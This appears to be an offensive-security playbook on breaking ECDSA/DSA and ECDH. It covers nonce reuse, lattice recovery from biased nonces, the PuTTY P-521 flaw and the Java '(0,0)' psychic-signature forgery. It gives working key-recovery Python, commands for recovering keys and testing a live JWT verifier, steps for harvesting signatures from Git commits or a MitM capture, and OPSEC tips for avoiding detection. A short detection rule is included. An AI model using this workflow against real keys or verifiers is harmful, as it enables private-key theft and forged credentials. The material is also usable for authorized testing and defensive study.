# ECDSA / DSA Nonce & Curve Attacks

Recover ECDSA/DSA private keys from nonce reuse, nonce bias, or implementation flaws, and
break ECDH via invalid-curve points. This is the highest-yield real-world crypto attack
class: signatures are public, recovery is offline, and the key is total compromise.
ATT&CK: T1552.004 (Private Keys), T1606.001 (Forge Web Credentials: SAML/token).
CWE-323 (Reusing a Nonce/Key Pair), CWE-1241 (Use of Predictable Algorithm in RNG),
CWE-347 (Improper Verification of Cryptographic Signature).

---

## 1. Theory / mechanism

ECDSA sign with private `d`, per-signature nonce `k`:
```
r = (k·G).x  mod n
s = k^-1 · (H(m) + r·d)  mod n
```
Two facts make this fragile:

1. **Nonce reuse → instant key recovery.** Same `k` on two messages gives equal `r`:
   `s1·k = H1 + r·d`, `s2·k = H2 + r·d` ⇒
   `k = (H1 − H2)/(s1 − s2) mod n`, then `d = (s1·k − H1)·r^-1 mod n`.

2. **Nonce bias → lattice recovery (Hidden Number Problem).** If even a few top/bottom
   bits of each `k` are constant/leaked, each signature is a noisy linear equation in `d`.
   Stack ~`n/leak` of them into a lattice and run **LLL/BKZ**; the short vector contains `d`.

Invalid-curve / small-subgroup attacks target ECDH: if a peer multiplies your "public
point" by its private scalar without checking the point is on the right curve, you send
points of small order on a weak curve, read residues mod small primes, and CRT-reconstruct
the private scalar.

---

## 2. Modern 2024-2026 variants (verified)

| Name | ID | Detail |
|------|-----|--------|
| **PuTTY P-521 bias** | **CVE-2024-31497** | PuTTY's deterministic ECDSA nonce for NIST **P-521** is biased in its top bits; **~58–60 signatures** recover the private key via LLL. Signatures are harvested from normal SSH auth and *public Git commit signing* — the attack is **retroactive** against historical signatures. Patched by replacing nonce generation. |
| **Minerva** | (family) | Timing leak of the **bit-length of the nonce** during scalar multiplication in libgcrypt, wolfSSL, MatrixSSL, SunEC/OpenJDK, Crypto++, and an Atmel smartcard. Full P-256 key from ~500 (sim), ~1200 (library), ~2100 (smartcard) signatures; cut TPM-FAIL's requirement from ~40000 to ~900. |
| **Psychic Signature** | CVE-2022-21449 | OpenJDK 15–18 accepted ECDSA `(r,s)=(0,0)` as valid for *every* key/message. Any `ES256/384/512` JWT forgeable with signature `MAYCAQACAQA`. Signature-verification flaw, same threat class as alg-confusion. |
| Blockchain biased nonces | (ongoing) | "Biased Nonce Sense" — lattice attacks recover keys from weak-RNG Bitcoin/Ethereum signatures still found in chain data. |

Sources: CVE-2024-31497 (PuTTY advisory; sentinelone DB); Minerva —
minerva.crocs.fi.muni.cz, eprint.iacr.org/2020/728; CVE-2022-21449 (Madden, "Psychic
Signatures"); Howgrave-Graham–Smart / Nguyen–Shparlinski HNP; bitlogik/lattice-attack.

---

## 3. Complete working code

`scripts/ecdsa_lattice.py` implements (a) nonce-reuse recovery, (b) HNP lattice recovery
with a pure-Python LLL fallback (no Sage required) and an automatic Sage/fpylll upgrade
path, and (c) the psychic-signature `(0,0)` check. Core math:

```python
def recover_reuse(r, s1, s2, h1, h2, n):
    """Same r (reused k) on two messages -> private key d."""
    k = ((h1 - h2) * pow(s1 - s2, -1, n)) % n
    d = ((s1 * k - h1) * pow(r, -1, n)) % n
    return d

def build_hnp_lattice(sigs, n, msb_known):
    """sigs: list of (r, s, h). msb_known = # leading nonce bits known to be 0.
    Returns a basis whose LLL-short vector encodes d (Hidden Number Problem)."""
    m = len(sigs)
    B = 2 ** (n.bit_length() - msb_known)        # nonce bound
    # t_i = r_i / s_i ;  a_i = h_i / s_i   (mod n)
    t = [(r * pow(s, -1, n)) % n for (r, s, h) in sigs]
    a = [(h * pow(s, -1, n)) % n for (r, s, h) in sigs]
    from fractions import Fraction as F
    # (m+2) x (m+2) Kannan-embedding lattice
    M = [[0] * (m + 2) for _ in range(m + 2)]
    for i in range(m):
        M[i][i] = n
    for i in range(m):
        M[m][i] = t[i]
    M[m][m] = F(B, n)
    for i in range(m):
        M[m + 1][i] = a[i]
    M[m + 1][m + 1] = B
    return M, B
```

`ecdsa_lattice.py` ships a self-contained rational LLL so it runs with stock Python; for
large corpora it auto-detects `fpylll`/SageMath and switches to BKZ.

### Workflow
```bash
# Detect reused nonces in a corpus, then recover
python3 scripts/ecdsa_lattice.py scan sigs.json            # flags duplicate r
python3 scripts/ecdsa_lattice.py recover sigs.json --mode reuse --curve secp256k1

# Biased-nonce (HNP) recovery — supply estimated known MSBs
python3 scripts/ecdsa_lattice.py recover sigs.json --mode hnp --curve secp521r1 --known-msb 9
#   PuTTY CVE-2024-31497: ~60 P-521 sigs, top ~9 bits biased

# Psychic-signature test against a live JWT verifier
python3 scripts/ecdsa_lattice.py psychic --jwt eyJhbGciOi... 
```

### Harvesting P-521 signatures for the PuTTY attack
```bash
# SSH signing & Git: signatures are in commit objects / SSH auth logs.
git log --show-signature --format='%H' | head        # SSH-signed commits expose (r,s)
# Or capture live SSH auth with a MitM/pcap and extract the signature blob.
```

---

## 4. Detection

```yaml
title: ECDSA Nonce Reuse / Bias Indicator
id: ecdsa-nonce-reuse
logsource: { product: application, category: crypto_audit }
detection:
  dup_r:   { event: 'signature_emitted', field_r|count_distinct_by: 'signer < signatures' }  # same r twice
  weak_lib: { component|contains: ['puttygen P-521', 'libgcrypt < 1.8.5', 'OpenJDK 15-18'] }
  condition: dup_r or weak_lib
level: critical
```
- **Reuse:** any two signatures from one key with identical `r` — trivially detectable in
  TLS/SSH/Git/blockchain corpora; flag in the report immediately.
- **Bias:** statistical — collect the signer's nonces' MSB distribution; deviation from
  uniform indicates a biased RNG. The recovery itself is offline (no target telemetry).
- **Psychic sig:** any inbound ECDSA signature decoding to `r=0` or `s=0` MUST be rejected;
  alert on `(0,0)` and on the literal token `...MAYCAQACAQA`.

---

## 5. OPSEC

- Signature collection is passive (public Git, TLS handshakes, chain explorers, SSH logs);
  recovery runs offline — **no footprint on the target** once you hold the sigs.
- The PuTTY attack works on *already-captured historical* signatures: collection can pre-date
  the engagement window — note this in scoping.
- Invalid-curve attacks against ECDH **are** interactive (you send crafted points) and will
  appear as malformed-handshake errors; rate-limit and only against authorized endpoints.
- Recovered keys are crown jewels: vault, encrypt, and recommend immediate rotation +
  upgrade to RFC 6979 deterministic nonces (and a non-vulnerable implementation).

---

## 6. References
- PuTTY P-521 bias: CVE-2024-31497; PuTTY 0.81 release notes
- Minerva: https://minerva.crocs.fi.muni.cz/ ; eprint.iacr.org/2020/728
- Psychic Signatures: CVE-2022-21449; Neil Madden, "CVE-2022-21449: Psychic Signatures in Java"
- "Biased Nonce Sense: Lattice Attacks Against Weak ECDSA Signatures in Cryptocurrencies"
- bitlogik/lattice-attack — https://github.com/bitlogik/lattice-attack
- Hidden Number Problem: Boneh–Venkatesan; Nguyen–Shparlinski (2002)
